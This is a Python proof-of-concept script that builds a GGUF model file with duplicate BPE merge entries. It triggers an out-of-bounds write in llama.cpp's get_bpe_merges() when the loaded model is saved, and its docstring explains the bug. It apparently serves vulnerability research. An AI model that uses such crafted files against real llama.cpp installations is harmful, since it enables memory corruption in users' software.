#!/usr/bin/env python3
"""
Craft a GGUF that triggers an OOB write in llama_vocab::get_bpe_merges().

Bug: BPE merges are loaded into `bpe_ranks` (an unordered_map) with rank = loop
index `i`. If the GGUF has duplicate merge entries, `emplace` deduplicates them,
so `bpe_ranks.size() < n_merges`. But the rank values (original indices) can
exceed `bpe_ranks.size()`.

`get_bpe_merges()` creates `result(bpe_ranks.size())` and indexes
`result[pair.second]` — OOB write when `pair.second >= bpe_ranks.size()`.

Example: merges = ["a b", "a b", "c d"]
  - i=0: emplace(("a","b"), 0) → inserted
  - i=1: emplace(("a","b"), 1) → NOT inserted (dup)
  - i=2: emplace(("c","d"), 2) → inserted
  bpe_ranks = {("a","b")→0, ("c","d")→2}, size=2
  result is sized 2, but result[2] is OOB!

Triggered via: llama_model_save_to_file() → add_kv_from_model() → get_bpe_merges()

Run:  python3 craft_oob_vocab_dup_merges.py out.gguf
Then: llama_model_save_to_file(model, "out2.gguf")
"""
import sys, os
from pathlib import Path
gguf_path = Path(__file__).resolve().parent.parent / "llama.cpp" / "gguf-py"
sys.path.insert(0, str(gguf_path))
import gguf

V = gguf.GGUFValueType

def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "models/crafted/vocab_dup_merges_oob.gguf"
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)

    w = gguf.GGUFWriter(out, arch="llama")

    def kv(key, val, t):
        w.add_key_value(key, val, t)

    # ---- base loader hparams ----
    kv("llama.context_length", 2048, V.UINT32)
    kv("llama.embedding_length", 64, V.UINT32)
    kv("llama.block_count", 1, V.UINT32)
    kv("llama.attention.head_count", 1, V.UINT32)
    kv("llama.attention.head_count_kv", 1, V.UINT32)
    kv("llama.feed_forward_length", 128, V.UINT32)
    kv("llama.attention.layer_norm_rms_epsilon", 1e-5, V.FLOAT32)
    kv("llama.rope.dimension_count", 64, V.UINT32)

    # ---- BPE tokenizer with duplicate merges ----
    # Using "gpt2" (BPE) which reads merges
    kv("tokenizer.ggml.model", "gpt2", V.STRING)

    # 4 tokens: enough to not trigger other issues
    n_vocab = 4
    w.add_key_value("tokenizer.ggml.tokens",
        ["a", "b", "c", "d"], V.ARRAY, sub_type=V.STRING)
    w.add_key_value("tokenizer.ggml.scores",
        [0.0]*n_vocab, V.ARRAY, sub_type=V.FLOAT32)
    w.add_key_value("tokenizer.ggml.token_type",
        [1]*n_vocab, V.ARRAY, sub_type=V.INT32)  # type=1 (NORMAL)

    # Override special token IDs to valid range (avoid OOB in print_info)
    kv("tokenizer.ggml.bos_token_id", 0, V.UINT32)
    kv("tokenizer.ggml.eos_token_id", 0, V.UINT32)
    kv("tokenizer.ggml.unknown_token_id", 0, V.UINT32)
    kv("tokenizer.ggml.padding_token_id", 0, V.UINT32)

    # CRITICAL: duplicate merges to trigger OOB in get_bpe_merges()
    # "a b" appears twice → emplace deduplicates, rank 1 is lost
    # "c d" at index 2 → rank=2, but bpe_ranks.size()=2 after dedup
    # result[2] on a vector of size 2 → OOB write
    w.add_key_value("tokenizer.ggml.merges",
        ["a b", "a b", "c d"], V.ARRAY, sub_type=V.STRING)

    w.write_header_to_file()
    w.write_kv_data_to_file()
    w.write_ti_data_to_file()
    w.close()
    print(f"Written {out} (gpt2 BPE with duplicate merges)")

if __name__ == "__main__":
    main()